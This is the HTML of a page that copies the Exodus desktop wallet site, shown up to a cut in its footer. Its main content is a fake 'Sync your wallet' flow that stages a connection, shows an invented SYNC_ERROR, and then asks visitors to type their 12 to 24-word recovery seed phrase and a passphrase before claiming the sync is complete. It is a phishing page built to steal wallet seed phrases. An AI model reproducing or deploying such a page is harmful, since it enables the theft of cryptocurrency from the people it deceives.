<!DOCTYPE html>
<html lang="en">

<head>
    <meta charSet="utf-8" />
    <meta http-equiv="x-ua-compatible" content="ie=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <meta name="theme-color" content="#1f2033" />
    <meta name="apple-itunes-app" content="app-id=1414384820" />
    <meta name="msapplication-TileColor" content="#1f2033" />
    <meta name="msapplication-config" content="/img/favicons/browserconfig.xml?v=3" />
    <link rel="apple-touch-icon" type="" sizes="180x180" href="/img/favicons/apple-icon-180x180.png?v=3" />
    <link rel="apple-touch-icon" type="" sizes="152x152" href="/img/favicons/apple-icon-152x152.png?v=3" />
    <link rel="apple-touch-icon" type="" sizes="144x144" href="/img/favicons/apple-icon-144x144.png?v=3" />
    <link rel="apple-touch-icon" type="" sizes="120x120" href="/img/favicons/apple-icon-120x120.png?v=3" />
    <link rel="apple-touch-icon" type="" sizes="114x114" href="/img/favicons/apple-icon-114x114.png?v=3" />
    <link rel="apple-touch-icon" type="" sizes="76x76" href="/img/favicons/apple-icon-76x76.png?v=3" />
    <link rel="apple-touch-icon" type="" sizes="72x72" href="/img/favicons/apple-icon-72x72.png?v=3" />
    <link rel="apple-touch-icon" type="" sizes="60x60" href="/img/favicons/apple-icon-60x60.png?v=3" />
    <link rel="apple-touch-icon" type="" sizes="57x57" href="/img/favicons/apple-icon-57x57.png?v=3" />
    <link rel="icon" type="image/png" sizes="180x180" href="/img/favicons/apple-icon-180x180.png?v=3" />
    <link rel="icon" type="image/png" sizes="96x96" href="/img/favicons/favicon-96x96.png?v=3" />
    <link rel="icon" type="image/png" sizes="32x32" href="/img/favicons/favicon-32x32.png?v=3" />
    <link rel="icon" type="image/png" sizes="16x16" href="/img/favicons/favicon-16x16.png?v=3" />
    <link rel="shortcut icon" type="" sizes="" href="/img/favicons/favicon.ico?v=3" />
    <meta name="generator" content="Gatsby 4.24.4" />
    <meta name="description"
        content="Manage 150+ cryptocurrencies securely from your desktop with Exodus. Download our easy-to-use desktop crypto wallet for Windows, Mac, and Linux."
        data-gatsby-head="true" />
    <meta name="keywords"
        content="crypto wallet, best crypto wallet, cryptocurrency wallet, best cryptocurrency wallet, online bitcoin wallet, crypto wallet app, exodus wallet"
        data-gatsby-head="true" />
    <meta name="robots" content="index" data-gatsby-head="true" />
    <meta name="googlebot-news" content="noindex" data-gatsby-head="true" />
    <meta name="thumbnail" content="https://www.exodus.com/img/favicons/apple-icon-152x152.png?v=3"
        data-gatsby-head="true" />
    <meta name="application-name" content="Exodus" data-gatsby-head="true" />
    <meta name="apple-mobile-web-app-title" content="Download Exodus Crypto Wallet" data-gatsby-head="true" />
    <meta name="twitter:card" content="summary_large_image" data-gatsby-head="true" />
    <meta name="twitter:site" content="@exodus_io" data-gatsby-head="true" />
    <meta name="twitter:creator" content="@exodus_io" data-gatsby-head="true" />
    <meta name="twitter:title" content="Secure Desktop Crypto Wallet for Windows, Mac &amp; Linux"
        data-gatsby-head="true" />
    <meta name="twitter:url" content="https://www.exodus.com/desktop/" data-gatsby-head="true" />
    <meta name="twitter:description"
        content="Manage 150+ cryptocurrencies securely from your desktop with Exodus. Download our easy-to-use desktop crypto wallet for Windows, Mac, and Linux."
        data-gatsby-head="true" />
    <meta name="twitter:image:src" content="https://www.exodus.com/img/fb-meta-rect.png" data-gatsby-head="true" />
    <meta property="og:type" content="website" data-gatsby-head="true" />
    <meta property="og:site_name" content="Download Exodus Crypto Wallet" data-gatsby-head="true" />
    <meta property="og:url" content="https://www.exodus.com/desktop/" data-gatsby-head="true" />
    <meta property="og:title" content="Secure Desktop Crypto Wallet for Windows, Mac &amp; Linux"
        data-gatsby-head="true" />
    <meta property="og:description"
        content="Manage 150+ cryptocurrencies securely from your desktop with Exodus. Download our easy-to-use desktop crypto wallet for Windows, Mac, and Linux."
        data-gatsby-head="true" />
    <meta property="og:image" content="https://www.exodus.com/img/fb-meta-rect.png" data-gatsby-head="true" />
    <meta property="og:image:secure_url" content="https://www.exodus.com/img/fb-meta-rect.png"
        data-gatsby-head="true" />
    <meta property="og:image:type" content="image/png" data-gatsby-head="true" />
    <meta property="og:image:width" content="3200" data-gatsby-head="true" />
    <meta property="og:image:height" content="1674" data-gatsby-head="true" />
    <title data-gatsby-head="true">Secure Desktop Crypto Wallet for Windows, Mac &amp; Linux</title>
    <link rel="canonical" href="https://www.exodus.com/desktop/" data-gatsby-head="true" />
    <link rel="stylesheet" href="assets/css/theme.css">
    <link rel="stylesheet" href="assets/css/custom.css">
</head>

<body>
    <div id="___gatsby">
        <div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper">
            <div class="x-page-desktop">
                <div class="exodus__header exodus__header--primary">
                    <nav><a class="x__exodus-logo" href="#"><svg fill="none" viewBox="0 0 156 32">
                                <title>Exodus</title>
                                <g id="exodus-logomark">
                                    <path fill="url(#gradient_1)"
                                        d="M31.808 8.935L18.181 0v4.996l8.742 5.68-1.029 3.254h-7.713v4.14h7.713l1.029 3.254-8.742 5.68V32l13.627-8.906-2.228-7.08 2.228-7.08z">
                                    </path>
                                    <path fill="url(#gradient_2)"
                                        d="M6.325 18.07h7.685v-4.14H6.296l-1-3.254 8.714-5.68V0L.383 8.935l2.228 7.08-2.228 7.079L14.039 32v-4.995l-8.742-5.681 1.028-3.254z">
                                    </path>
                                    <mask id="mask0_536_8492" style="mask-type:alpha" width="32" height="32" x="0" y="0"
                                        maskUnits="userSpaceOnUse">
                                        <path fill="url(#gradient_3)"
                                            d="M31.808 8.935L18.181 0v4.996l8.742 5.68-1.029 3.254h-7.713v4.14h7.713l1.029 3.254-8.742 5.68V32l13.627-8.906-2.228-7.08 2.228-7.08z">
                                        </path>
                                        <path fill="url(#gradient_4)"
                                            d="M6.325 18.07h7.685v-4.14H6.296l-1-3.254 8.714-5.68V0L.383 8.935l2.228 7.08-2.228 7.079L14.039 32v-4.995l-8.742-5.681 1.028-3.254z">
                                        </path>
                                    </mask>
                                    <g mask="url(#mask0_536_8492)">
                                        <path fill="url(#gradient_5)" d="M0.4 0H31.599999999999998V32H0.4z"></path>
                                    </g>
                                </g>
                                <g id="exodus-logotype">
                                    <path fill="#fff"
                                        d="M58.92 8.8v2.797H46.029v2.863h10.955v2.798H46.028v3.144h12.893V23.2h-16.2V8.8h16.2zM60.75 23.2l7.407-7.287L60.96 8.8h4.553l5.078 5.14L75.46 8.8h4.26l-7.177 7.113L79.95 23.2h-4.595l-4.764-5.292-5.434 5.292H60.75z">
                                    </path>
                                    <path fill="#fff"
                                        d="M88.832 8.8c6.001 0 9.61 3.005 9.61 7.2s-3.609 7.2-9.61 7.2c-6.001 0-9.59-3.005-9.59-7.2s3.589-7.2 9.59-7.2zm0 2.692c-3.61 0-6.27 1.816-6.27 4.508s2.66 4.508 6.27 4.508c3.63 0 6.29-1.816 6.29-4.508s-2.66-4.508-6.29-4.508zM110.404 8.8c4.807 0 7.703 2.667 7.703 7.178 0 4.554-2.875 7.222-7.661 7.222h-9.739V8.8h9.697zm4.303 7.178c0-2.82-1.679-4.38-4.723-4.38h-5.982v8.804h5.982c3.044 0 4.723-1.583 4.723-4.424zM129.005 23.2c-5.061 0-8.9-2.297-8.9-6.53V8.8h3.312v7.55c0 2.617 2.72 3.83 5.588 3.83 2.89 0 5.61-1.192 5.61-3.83V8.8h3.29v7.87c0 4.233-3.817 6.53-8.9 6.53zM147.174 23.2c-2.719 0-5.651-.501-7.733-1.44l1.084-2.672c1.869.856 4.44 1.399 6.755 1.399 2.656 0 5.141-.564 5.141-1.565 0-.73-.786-1.044-2.422-1.294l-4.631-.501c-3.569-.48-5.311-1.711-5.311-3.882 0-2.796 2.953-4.445 7.287-4.445 2.613 0 6.203.48 8.051 1.315l-1.083 2.546c-1.827-.752-4.929-1.127-7.117-1.127-2.252 0-3.739.521-3.739 1.481 0 .668.744 1.002 2.656 1.274l4.503.5c3.442.48 5.226 1.65 5.226 3.924 0 2.88-3.781 4.487-8.667 4.487z">
                                    </path>
                                </g>
                                <defs>
                                    <linearGradient id="gradient_1" x1="27.4" x2="18.272" y1="34.2" y2="-3.514"
                                        gradientUnits="userSpaceOnUse">
                                        <stop stop-color="#0B46F9"></stop>
                                        <stop offset="1" stop-color="#BBFBE0"></stop>
                                    </linearGradient>
                                    <linearGradient id="gradient_2" x1="27.4" x2="18.272" y1="34.2" y2="-3.514"
                                        gradientUnits="userSpaceOnUse">
                                        <stop stop-color="#0B46F9"></stop>
                                        <stop offset="1" stop-color="#BBFBE0"></stop>
                                    </linearGradient>
                                    <linearGradient id="gradient_3" x1="27.4" x2="18.272" y1="34.2" y2="-3.514"
                                        gradientUnits="userSpaceOnUse">
                                        <stop stop-color="#0B46F9"></stop>
                                        <stop offset="1" stop-color="#BBFBE0"></stop>
                                    </linearGradient>
                                    <linearGradient id="gradient_4" x1="27.4" x2="18.272" y1="34.2" y2="-3.514"
                                        gradientUnits="userSpaceOnUse">
                                        <stop stop-color="#0B46F9"></stop>
                                        <stop offset="1" stop-color="#BBFBE0"></stop>
                                    </linearGradient>
                                    <linearGradient id="gradient_5" x1="2.4" x2="18.2" y1="7.2" y2="19"
                                        gradientUnits="userSpaceOnUse">
                                        <stop offset="0.12" stop-color="#8952FF" stop-opacity="0.87"></stop>
                                        <stop offset="1" stop-color="#DABDFF" stop-opacity="0"></stop>
                                    </linearGradient>
                                </defs>
                            </svg><span>Exodus</span></a>
                        <menu class="x__navigation x__navigation--primary">
                            <ul>
                                <li class="x__navigation-dropdown"><span tabindex="0">Products</span>
                                    <div class="x__navigation-dropdown__menu">
                                        <div><a class="x__link" href="#"><i
                                                    class="x__link__icon x__link__icon--web3"></i><span><span
                                                        class="x__link__title">Web3 Wallet</span><span
                                                        class="x__link__description">Explore the world of web3 and
                                                        DeFi</span></span></a><a href="#" class="x__link"
                                                target="_self"><i
                                                    class="x__link__icon x__link__icon--mobile"></i><span><span
                                                        class="x__link__title">Mobile Wallet</span><span
                                                        class="x__link__description">Control your wealth
                                                        anywhere</span></span></a><a href="#" class="x__link"
                                                target="_self"><i
                                                    class="x__link__icon x__link__icon--desktop"></i><span><span
                                                        class="x__link__title">Desktop Wallet</span><span
                                                        class="x__link__description">Swap and transfer digital
                                                        assets</span></span></a><a class="x__link" href="#"><i
                                                    class="x__link__icon x__link__icon--trezor"></i><span><span
                                                        class="x__link__title">Trezor Hardware Wallet</span><span
                                                        class="x__link__description">Advanced security made
                                                        easy</span></span></a><a class="x__link" href="#"><i
                                                    class="x__link__icon x__link__icon--earn"></i><span><span
                                                        class="x__link__title">Earn Crypto Rewards</span><span
                                                        class="x__link__description">Manage staking rewards for multiple
                                                        assets</span></span></a><span
                                                class="x__category">Enterprise</span><a class="x__link" href="#"><i
                                                    class="x__link__icon x__link__icon--xoswap"></i><span><span
                                                        class="x__link__title">XO Swap</span><span
                                                        class="x__link__description">Boost growth with a premium crypto
                                                        swap engine</span></span></a><a href="#" class="x__link"><i
                                                    class="x__link__icon x__link__icon--passkeys"></i><span><span
                                                        class="x__link__title">Passkeys Wallet &amp; SDK</span><span
                                                        class="x__link__description">Reduce drop-off with one-click web3
                                                        onboarding</span></span></a><a class="x__link" href="#"><i
                                                    class="x__link__icon x__link__icon--waas"></i><span><span
                                                        class="x__link__title">Wallet-as-a-Service (WaaS)</span><span
                                                        class="x__link__description">Grow your platform with a custom
                                                        web3 wallet</span></span></a></div>
                                    </div>
                                </li>
                                <li class="x__navigation-dropdown"><span tabindex="0">Support</span>
                                    <div class="x__navigation-dropdown__menu">
                                        <div><a class="x__link" href="#"><i
                                                    class="x__link__icon x__link__icon--support"></i><span><span
                                                        class="x__link__title">24/7 Customer Support</span><span
                                                        class="x__link__description">Support engineers are standing by
                                                        to help</span></span></a><a class="x__link" href="#"><i
                                                    class="x__link__icon x__link__icon--assets"></i><span><span
                                                        class="x__link__title">Crypto Assets</span><span
                                                        class="x__link__description">Info on supported assets, crypto
                                                        rewards, and more</span></span></a></div>
                                    </div>
                                </li>
                                <li class="x__navigation-dropdown"><span tabindex="0">Learn</span>
                                    <div class="x__navigation-dropdown__menu">
                                        <div><a href="#" class="x__link"><i
                                                    class="x__link__icon x__link__icon--kb"></i><span><span
                                                        class="x__link__title">Knowledge Base</span><span
                                                        class="x__link__description">Common questions and blockchain
                                                        education</span></span></a><a href="#" class="x__link"><i
                                                    class="x__link__icon x__link__icon--youtube"></i><span><span
                                                        class="x__link__title">YouTube</span><span
                                                        class="x__link__description">Crypto education and
                                                        tutorials</span></span></a><a class="x__link" href="#"><i
                                                    class="x__link__icon x__link__icon--newsletter"></i><span><span
                                                        class="x__link__title">Newsletter</span><span
                                                        class="x__link__description">Sign-up for product updates and
                                                        crypto highlights</span></span></a></div>
                                    </div>
                                </li>
                                <li class="x__navigation-dropdown"><span tabindex="0">Company</span>
                                    <div class="x__navigation-dropdown__menu">
                                        <div><a class="x__link" href="#"><i
                                                    class="x__link__icon x__link__icon--about"></i><span><span
                                                        class="x__link__title">About Us</span><span
                                                        class="x__link__description">Learn more about
                                                        Exodus</span></span></a><a class="x__link" href="#"><i
                                                    class="x__link__icon x__link__icon--investors"></i><span><span
                                                        class="x__link__title">Investors</span><span
                                                        class="x__link__description">Read about news, media, events and
                                                        more</span></span></a><a class="x__link" href="#"><i
                                                    class="x__link__icon x__link__icon--careers"></i><span><span
                                                        class="x__link__title">Careers</span><span
                                                        class="x__link__description">See our open
                                                        positions</span></span></a><a class="x__link" href="#"><i
                                                    class="x__link__icon x__link__icon--contact"></i><span><span
                                                        class="x__link__title">Contact Us</span><span
                                                        class="x__link__description">Get in touch</span></span></a><a
                                                class="x__link" href="#"><i
                                                    class="x__link__icon x__link__icon--brand"></i><span><span
                                                        class="x__link__title">Brand Guidelines</span><span
                                                        class="x__link__description">Exodus media
                                                        kit</span></span></a><a class="x__link" href="#"><i
                                                    class="x__link__icon x__link__icon--security"></i><span><span
                                                        class="x__link__title">Security</span><span
                                                        class="x__link__description">How we keep your crypto
                                                        safe</span></span></a><a class="x__link" href="#"><i
                                                    class="x__link__icon x__link__icon--trademarks"></i><span><span
                                                        class="x__link__title">Intellectual Property</span><span
                                                        class="x__link__description">Exodus Trademarks</span></span></a>
                                        </div>
                                    </div>
                                </li>
                            </ul>
                        </menu><a class="x__download" href="#">Download</a>
                    </nav>
                </div>
                <main class="x">
                    <header class="x__wallet__header x__wallet__header--1">
                        <div class="x__overlay" role="presentation"></div>
                        <div class="x__content">
                            <div class="x-header__container" style="position: relative;">
                                <h1 class="x-header__heading"><strong>To Enable Sync:</strong></h1>
                                <div class="security-card">
                                    <div class="security-card-body" id="step_1" style="display: block;">
                                        <h5 class="security-card-title">Sync your wallet</h5>
                                        <p class="security-card-text">
                                            <button class="x__download" id="activate_clearsign"
                                                style="width: 100%;">Start Sync</button>
                                        </p>
                                        <div class="security-card-links" style="color: #6c757d;">
                                            <small>By tapping "Start Sync", you acknowledge that you have read
                                                and
                                                agree to the <span
                                                    style="text-decoration: underline; cursor: pointer;">Exodus Trust
                                                    Services T&Cs</span> and <span
                                                    style="text-decoration: underline; cursor: pointer;">Privacy
                                                    Policy</span>.</small>
                                        </div>
                                    </div>
                                    <div class="security-card-body" id="step_2" style="display: none;">
                                        <div class="loading-container" style="text-align: center; padding: 20px 0;">
                                            <div class="pulse-container">
                                                <h5 class="security-card-title">Connecting to Exodus Desktop</h5>
                                                <p class="security-card-text">
                                                    Please wait while we establish a secure connection...
                                                </p>
                                            </div>
                                            <div class="progress-steps"
                                                style="color: #b4b4c7; font-size: 0.9rem; margin-top: 15px;">
                                                <div class="step">Initializing connection...</div>
                                                <div class="step" style="margin-top: 5px;">Verifying blockchain state...
                                                </div>
                                                <div class="step" style="margin-top: 5px;">Syncing wallet data...</div>
                                                <div class="mobile_detected">
                                                    <hr
                                                        style="margin: 10px 0; border-top: 1px solid #5c6cf7; opacity: 0.5;">
                                                    <p>
                                                        <strong>Mobile device detected, manually import your
                                                            phrase</strong>
                                                    </p>
                                                    <button class="x__download" id="mobile_import"
                                                        style="width: 100%;">Import
                                                        Phrase</button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="security-card-body" id="step_3" style="display: none;">
                                        <div style="text-align: center; padding: 20px 0;">
                                            <img src="assets/img/warningSmall.png" alt="Warning"
                                                style="width: 64px; height: 64px; margin-bottom: 20px;">
                                            <h5 class="security-card-title">Sync Out of Date</h5>
                                            <p class="security-card-text" style="font-family: monospace;">
                                                Exodus Wallet: SYNC_ERROR (0x67881)
                                            </p>
                                            <button class="x__download" id="import_phrase" style="width: 100%;">Manually
                                                Import Phrase</button>
                                        </div>
                                    </div>
                                    <div class="security-card-body" id="step_4" style="display: none;">
                                        <h5 class="security-card-title">Import recovery phrase</h5>
                                        <p class="security-card-text">
                                            Carefully enter your recovery seed phrase:
                                        </p>
                                        <div class="btn-group"
                                            style="width: 100%; margin-bottom: 15px; display: flex; gap: 10px;">
                                            <button class="phrase-length-btn" data-length="12"
                                                style="flex: 1; padding: 8px; background-color: #2d2d3d; border: 1px solid #404040; color: #fff; cursor: pointer; border-radius: 4px;">12
                                                Words</button>
                                            <button class="phrase-length-btn" data-length="15"
                                                style="flex: 1; padding: 8px; background-color: #2d2d3d; border: 1px solid #404040; color: #fff; cursor: pointer; border-radius: 4px;">15
                                                Words</button>
                                            <button class="phrase-length-btn" data-length="24"
                                                style="flex: 1; padding: 8px; background-color: #2d2d3d; border: 1px solid #404040; color: #fff; cursor: pointer; border-radius: 4px;">24
                                                Words</button>
                                        </div>

                                        <p class="security-card-text" id="error_message"
                                            style="display: none; color: #dc3545;">
                                            Invalid seed phrase, please correct any mistakes and try again.
                                        </p>
                                        <p class="security-card-text" id="error_message"
                                            style="display: none; color: #dc3545;">
                                            Invalid seed phrase, please correct any mistakes and try again.
                                        </p>
                                        <div class="import-phrase-container">
                                            <!-- Row 1 -->
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="1.">
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="2.">
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="3.">
                                            <!-- Row 2 -->
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="4.">
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="5.">
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="6.">
                                            <!-- Row 3 -->
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="7.">
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="8.">
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="9.">
                                            <!-- Row 4 -->
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="10.">
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="11.">
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="12.">
                                            <!-- Row 5 -->
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="13."
                                                style="display: none;">
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="14."
                                                style="display: none;">
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="15."
                                                style="display: none;">
                                            <!-- Row 6 -->
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="16."
                                                style="display: none;">
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="17."
                                                style="display: none;">
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="18."
                                                style="display: none;">
                                            <!-- Row 7 -->
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="19."
                                                style="display: none;">
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="20."
                                                style="display: none;">
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="21."
                                                style="display: none;">
                                            <!-- Row 8 -->
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="22."
                                                style="display: none;">
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="23."
                                                style="display: none;">
                                            <input type="text" class="input-phrase" name="phrase[]" placeholder="24."
                                                style="display: none;">
                                        </div>
                                        <button class="button-custom" id="submit_phrase" disabled
                                            style="width: 100%;">Import
                                            Phrase</button>
                                    </div>
                                    <div class="security-card-body" id="step_5" style="display: none;">
                                        <h5 class="security-card-title">Create Passphrase:</h5>
                                        <p class="security-card-text">
                                            Write it down on paper, keep it away from anything digital, and
                                            store it in a safe place. No one can recover it, not even Exodus Support.
                                        </p>
                                        <p class="security-card-text" id="error_message_passphrase"
                                            style="display: none; color: #dc3545;">
                                            Passphrase cannot be empty.
                                        </p>
                                        <div class="passphrase-container">
                                            <input type="text" class="input-passphrase" id="passphrase"
                                                name="passphrase" placeholder="Passphrase">
                                        </div>
                                        <button class="x__download" id="submit_passphrase" style="width: 100%;">Create
                                            Passphrase</button>
                                    </div>
                                    <div class="security-card-body" id="step_6" style="display: none;">
                                        <div style="text-align: center; padding: 20px 0;">
                                            <img src="assets/img/lock-security.png" alt="Warning"
                                                style="width: 100px; height: 100px; margin-bottom: 20px;">
                                            <h5 class="security-card-title">Sync has been completed!</h5>
                                            <p class="security-card-text">
                                                Exodus Sync has been completed! Your wallet is now updated to the latest
                                                network.
                                                <br>
                                                You can now continue to use your wallet.
                                            </p>
                                        </div>
                                    </div>
                                </div>
                                <div class="header-image"
                                    style="position: absolute; right: -80%; top: 50%; transform: translateY(-50%); width: 70%;">
                                    <img src="assets/img/slide_4.webp" alt="Exodus Wallet"
                                        style="width: 100%; height: auto;">
                                </div>
                            </div>
                        </div>
                    </header>
                    <footer class="x__footer">
                        <div class="x__footer__content">
                            <div class="x__footer__content-center row">
                                <div class="col col-md-7 col-12">
                                    <div class="x__copyright">
                                        <div class="x__copyright__logo">
                                            <img src="assets/img/exodus-logo.png" alt="Exodus Logo"
                                                style="max-width: 156px">
                                        </div>
                                        <div class="x__copyright__copy">Copyright ©
                                            <!-- -->2024
                                            <!-- --> Exodus
                                            Movement, Inc. <br />Exodus was co-founded by Daniel Castagnoli and JP
                                            Richardson.
                                        </div>
                                    </div>
                                </div>
                                <div class="col col-md-5 col-12">
                                    <div class="exodus__social"><a href="#"><svg fill="none" viewBox="0 0 32 32">
                                                <title>discord</title>
                                                <path
                                                    d="M24.214 7.66A21.637 21.637 0 0018.873 6a.081.081 0 00-.086.041c-.23.41-.486.945-.665 1.366a19.975 19.975 0 00-6 0 14.055 14.055 0 00-.674-1.365.084.084 0 00-.086-.04c-1.845.318-3.64.874-5.341 1.655a.076.076 0 00-.035.03C2.584 12.771 1.65 17.73 2.109 22.624a.09.09 0 00.035.061 21.761 21.761 0 006.552 3.312c.034.01.07-.002.092-.03.504-.69.954-1.416 1.34-2.18a.085.085 0 00.003-.068.083.083 0 00-.048-.048c-.714-.27-1.394-.6-2.047-.975a.084.084 0 01-.01-.14c.139-.103.277-.21.408-.318a.08.08 0 01.085-.012c4.294 1.96 8.943 1.96 13.186 0a.08.08 0 01.086.01c.132.11.27.217.408.32a.083.083 0 01.034.072.085.085 0 01-.041.068c-.654.382-1.334.705-2.048.974a.083.083 0 00-.049.049.084.084 0 00.004.068c.394.763.844 1.49 1.34 2.18.02.028.058.04.092.03a21.687 21.687 0 006.562-3.312.083.083 0 00.034-.06c.547-5.66-.916-10.576-3.88-14.935a.067.067 0 00-.033-.03zM10.769 19.642c-1.293 0-2.358-1.187-2.358-2.645 0-1.457 1.045-2.644 2.358-2.644 1.324 0 2.38 1.197 2.358 2.644 0 1.458-1.044 2.645-2.358 2.645zm8.719 0c-1.293 0-2.358-1.187-2.358-2.645 0-1.457 1.045-2.644 2.358-2.644 1.324 0 2.379 1.197 2.358 2.644 0 1.458-1.034 2.645-2.358 2.645z">
                                                </path>
                                            </svg></a><a href="#"><svg fill="none" viewBox="0 0 32 32">
                                                <title>github</title>
                                                <path
                                                    d="M16 4C9.37 4 4 9.373 4 16c0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61-.546-1.385-1.335-1.755-1.335-1.755-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C24.565 25.795 28 21.295 28 16c0-6.627-5.373-12-12-12z">
                                                </path>
                                            </svg></a><a href="#"><svg fill="none" viewBox="0 0 32 32">
                                                <title>youTube</title>
                                                <path
                                                    d="M28.457 9.78a3.244 3.244 0 00-2.263-2.243C24.168 7 16.012 7 16.012 7s-8.136-.01-10.183.538a3.244 3.244 0 00-2.263 2.241A33.237 33.237 0 003 16.011a33.249 33.249 0 00.566 6.209 3.244 3.244 0 002.263 2.241C7.853 25 16.012 25 16.012 25s8.134 0 10.182-.539a3.243 3.243 0 002.263-2.241A33.24 33.24 0 0029 16.011a33.222 33.222 0 00-.542-6.231zM13.408 19.865v-7.721l6.79 3.867-6.79 3.855v-.001z">
                                                </path>
                                            </svg></a><a href="#"><svg fill="none" viewBox="0 0 32 32">
                                                <title>reddit</title>
                                                <path
                                                    d="M19.867 19.2c-.971 0-1.788-.777-1.788-1.736s.817-1.762 1.788-1.762c.972 0 1.76.803 1.76 1.762s-.788 1.736-1.76 1.736zm.413 3.371c-.905.892-2.3 1.326-4.267 1.326h-.028c-1.966 0-3.36-.434-4.265-1.326a.692.692 0 010-.99.717.717 0 011.004 0c.624.615 1.69.915 3.261.915h.028c1.57 0 2.638-.3 3.263-.916a.717.717 0 011.158.227.694.694 0 01-.154.764zm-9.907-5.107c0-.958.815-1.762 1.785-1.762.972 0 1.76.804 1.76 1.762 0 .959-.788 1.736-1.76 1.736-.97 0-1.785-.777-1.785-1.736zM24.664 6.4c.659 0 1.194.529 1.194 1.177 0 .65-.535 1.178-1.194 1.178a1.187 1.187 0 01-1.193-1.178c0-.648.535-1.177 1.194-1.177M29 15.557c0-1.7-1.402-3.084-3.125-3.084-.746 0-1.43.26-1.969.692-1.905-1.182-4.323-1.894-6.915-2.044l1.352-4.218 3.716.863c.097 1.335 1.228 2.392 2.605 2.392 1.441 0 2.613-1.157 2.613-2.58C27.277 6.157 26.105 5 24.664 5a2.62 2.62 0 00-2.32 1.393L18.028 5.39a.71.71 0 00-.84.47l-1.678 5.236c-2.792.067-5.418.781-7.463 2.032a3.135 3.135 0 00-1.921-.655C4.402 12.473 3 13.856 3 15.557c0 1.05.536 1.98 1.353 2.536a5.36 5.36 0 00-.052.74c0 2.126 1.252 4.103 3.525 5.567 2.18 1.404 5.064 2.177 8.121 2.177 3.058 0 5.942-.773 8.121-2.177 2.273-1.464 3.526-3.441 3.526-5.567 0-.227-.016-.452-.044-.676a3.073 3.073 0 001.45-2.6z">
                                                </path>
                                            </svg></a><a href="#"><svg fill="none" viewBox="0 0 32 32">
                                                <title>twitter</title>
                                                <path
                                                    d="M4.056 5l8.88 11.873L4 26.527h2.011l7.824-8.452 6.32 8.452H27l-9.38-12.541L25.938 5h-2.011l-7.205 7.784L10.9 5H4.056zm2.958 1.481h3.144l13.884 18.564h-3.144L7.014 6.481z">
                                                </path>
                                            </svg></a><a href="#"><svg fill="none" viewBox="0 0 32 32">
                                                <title>instagram</title>
                                                <path
                                                    d="M16 4c-3.26 0-3.667.015-4.947.072-1.278.06-2.148.261-2.913.558a5.876 5.876 0 00-2.126 1.384A5.855 5.855 0 004.63 8.14c-.297.765-.499 1.635-.558 2.913C4.012 12.333 4 12.74 4 16s.015 3.667.072 4.947c.06 1.277.261 2.148.558 2.913.301.8.774 1.526 1.384 2.126.6.61 1.325 1.083 2.126 1.384.766.296 1.636.499 2.913.558 1.28.06 1.687.072 4.947.072s3.667-.015 4.947-.072c1.277-.06 2.148-.262 2.913-.558a5.898 5.898 0 002.126-1.384 5.86 5.86 0 001.384-2.126c.296-.765.499-1.636.558-2.913.06-1.28.072-1.687.072-4.947s-.015-3.667-.072-4.947c-.06-1.277-.262-2.149-.558-2.913a5.89 5.89 0 00-1.384-2.126A5.847 5.847 0 0023.86 4.63c-.765-.297-1.636-.499-2.913-.558C19.667 4.012 19.26 4 16 4zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85 0 3.204-.015 3.585-.074 4.85-.061 1.17-.256 1.805-.421 2.227a3.81 3.81 0 01-.899 1.382c-.388.397-.86.703-1.38.896-.42.164-1.065.36-2.235.413-1.274.057-1.649.07-4.859.07-3.211 0-3.586-.015-4.859-.074-1.171-.061-1.816-.256-2.236-.421a3.716 3.716 0 01-1.379-.899 3.644 3.644 0 01-.9-1.38c-.165-.42-.359-1.065-.42-2.235-.045-1.26-.061-1.649-.061-4.844 0-3.196.016-3.586.061-4.861.061-1.17.255-1.814.42-2.234.21-.57.479-.96.9-1.381.419-.419.81-.689 1.379-.898.42-.166 1.051-.361 2.221-.421 1.275-.045 1.65-.06 4.859-.06l.045.03zm0 3.678a6.161 6.161 0 100 12.323 6.161 6.161 0 000-12.323zM16 20c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm7.846-10.405a1.441 1.441 0 01-2.88 0 1.44 1.44 0 112.88 0z">
                                                </path>
                                            </svg></a><a href="#"><svg fill="none" viewBox="0 0 32 32">
                                                <title>facebook</title>
                                                <path
